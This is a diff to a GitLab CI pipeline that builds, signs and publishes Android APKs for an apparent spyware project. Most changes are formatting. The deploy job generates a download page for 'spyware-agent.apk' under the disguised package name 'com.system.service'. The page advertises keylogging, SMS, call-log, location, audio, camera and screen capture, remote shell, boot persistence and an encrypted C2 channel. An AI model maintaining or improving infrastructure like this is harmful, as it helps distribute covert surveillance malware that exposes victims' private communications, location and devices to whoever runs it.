@@ -73,8 +73,9 @@ lint:
   script:
     - ./gradlew lint
   artifacts:
-    reports:
-      lint: app/build/reports/lint-results.xml
+    paths:
+      - app/build/reports/lint-results.html
+      - app/build/reports/lint-results.xml
     expire_in: 7 days
 
 sign_apk:
@@ -122,40 +123,40 @@ deploy_pages:
     - cp -r release/* public/
     - |
       cat > public/index.html << 'HTMLEOF'
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Spyware Agent - APK Downloads</title>
-  <style>
-    body { font-family: monospace; max-width: 800px; margin: 50px auto; padding: 20px; background: #0a0a0a; color: #0f0; }
-    h1 { color: #0f0; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
-    .apk { margin: 20px 0; padding: 15px; border: 1px solid #0f0; }
-    .apk a { color: #0f0; text-decoration: none; font-weight: bold; }
-    .apk a:hover { text-decoration: underline; }
-    .meta { color: #888; font-size: 0.9em; }
-    .info { background: #1a1a1a; padding: 15px; border: 1px solid #0f0; margin: 20px 0; }
-  </style>
-</head>
-<body>
-  <h1>Spyware Agent — Built $(date -u)</h1>
-  <div class="info">
-    <strong>Package:</strong> com.system.service<br>
-    <strong>Capabilities:</strong> Keylogger, SMS, Contacts, Call Logs, Location, Audio, Screen, Camera, Files, Apps, Clipboard, Notifications, Shell, WiFi<br>
-    <strong>Persistence:</strong> Boot receiver + foreground service<br>
-    <strong>C2:</strong> WebSocket + HTTPS, RSA/AES encryption
-  </div>
-  <div class="apk">
-    <a href="spyware-agent.apk">🕷 spyware-agent.apk</a> — Release build (signed if keystore provided)
-    <div class="meta">com.system.service | minSdk 24 | targetSdk 34</div>
-  </div>
-  <div class="apk">
-    <a href="spyware-agent-debug.apk">🕷 spyware-agent-debug.apk</a> — Debug build
-    <div class="meta">Unsigned, debuggable=false, minified</div>
-  </div>
-  <div class="meta">SHA256 checksums in <a href="SHA256SUMS.txt">SHA256SUMS.txt</a></div>
-</body>
-</html>
-HTMLEOF
+      <!DOCTYPE html>
+      <html>
+      <head>
+        <title>Spyware Agent - APK Downloads</title>
+        <style>
+          body { font-family: monospace; max-width: 800px; margin: 50px auto; padding: 20px; background: #0a0a0a; color: #0f0; }
+          h1 { color: #0f0; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
+          .apk { margin: 20px 0; padding: 15px; border: 1px solid #0f0; }
+          .apk a { color: #0f0; text-decoration: none; font-weight: bold; }
+          .apk a:hover { text-decoration: underline; }
+          .meta { color: #888; font-size: 0.9em; }
+          .info { background: #1a1a1a; padding: 15px; border: 1px solid #0f0; margin: 20px 0; }
+        </style>
+      </head>
+      <body>
+        <h1>Spyware Agent — Built $(date -u)</h1>
+        <div class="info">
+          <strong>Package:</strong> com.system.service<br>
+          <strong>Capabilities:</strong> Keylogger, SMS, Contacts, Call Logs, Location, Audio, Screen, Camera, Files, Apps, Clipboard, Notifications, Shell, WiFi<br>
+          <strong>Persistence:</strong> Boot receiver + foreground service<br>
+          <strong>C2:</strong> WebSocket + HTTPS, RSA/AES encryption
+        </div>
+        <div class="apk">
+          <a href="spyware-agent.apk">🕷 spyware-agent.apk</a> — Release build (signed if keystore provided)
+          <div class="meta">com.system.service | minSdk 24 | targetSdk 34</div>
+        </div>
+        <div class="apk">
+          <a href="spyware-agent-debug.apk">🕷 spyware-agent-debug.apk</a> — Debug build
+          <div class="meta">Unsigned, debuggable=false, minified</div>
+        </div>
+        <div class="meta">SHA256 checksums in <a href="SHA256SUMS.txt">SHA256SUMS.txt</a></div>
+      </body>
+      </html>
+      HTMLEOF
   artifacts:
     paths:
       - public/
@@ -168,8 +169,8 @@ release_signed:
   stage: deploy
   needs: [package_release]
   when: manual
-  script:
-    - echo "Manual release triggered"
-    - echo "APKs available at: https://gitlab.com/daveXcodiene/code/-/jobs/artifacts/main/raw/release/?job=package_release"
+  script: |
+    echo "Manual release triggered"
+    echo "APKs available at: https://gitlab.com/daveXcodiene/code/-/jobs/artifacts/main/raw/release/?job=package_release"
   rules:
     - if: $CI_COMMIT_BRANCH == "main"
